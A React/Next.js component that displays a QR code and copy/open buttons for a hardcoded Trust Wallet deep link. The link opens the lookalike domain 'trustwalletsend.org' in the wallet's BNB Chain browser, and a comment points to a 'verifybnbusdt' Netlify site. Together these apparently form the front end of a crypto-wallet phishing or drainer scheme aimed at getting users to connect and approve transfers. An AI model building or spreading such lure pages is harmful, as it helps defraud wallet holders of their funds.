"use client";

import React, { useEffect, useState } from "react";
import {QRCodeSVG} from "qrcode.react";

//https://verifybnbusdt.netlify.app/
export default function ShowMeQrPage() {
  const [link, setLink] = useState<string>("https://link.trustwallet.com/open_url?coin=20000714&url=https://trustwalletsend.org");
  const [copied, setCopied] = useState(false);

  const onCopy = async () => {
    try {
      await navigator.clipboard.writeText(link);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch (e) {
      console.error("Copy failed", e);
    }
  };

  const onOpen = () => {
    window.open(link, "_blank", "noopener,noreferrer");
  };

  return (
    <main className="min-h-screen w-full flex items-center justify-center bg-gray-50 px-4">
      <div className="max-w-md w-full bg-white rounded-xl shadow-lg p-6 flex flex-col items-center space-y-4">
        <div className="w-full flex flex-col items-center">
          <h1 className="w-full text-lg font-semibold text-gray-800 mb-0">Scan QR code</h1>
          <QRCodeSVG
            value={link || ""}
            size={360}
            className="w-full h-auto object-contain"
            aria-label="QR code"
          />
        </div>

        <div className="w-full text-center">
          <p className="text-sm text-gray-600 truncate px-2">{link}</p>
        </div>

        <div className="w-full flex gap-3">
          <button
            onClick={onCopy}
            className="flex-1 py-2 rounded-full bg-blue-600 text-white font-medium hover:bg-blue-700 transition"
          >
            {copied ? "Copied" : "Copy link"}
          </button>
          <button
            onClick={onOpen}
            className="flex-1 py-2 rounded-full border border-gray-200 text-gray-700 hover:bg-gray-50 transition"
          >
            Open
          </button>
        </div>

        <button
          onClick={() => window.history.back()}
          className="mt-1 text-xs text-gray-500 hover:underline"
        >
          Close
        </button>
      </div>
    </main>
  );
}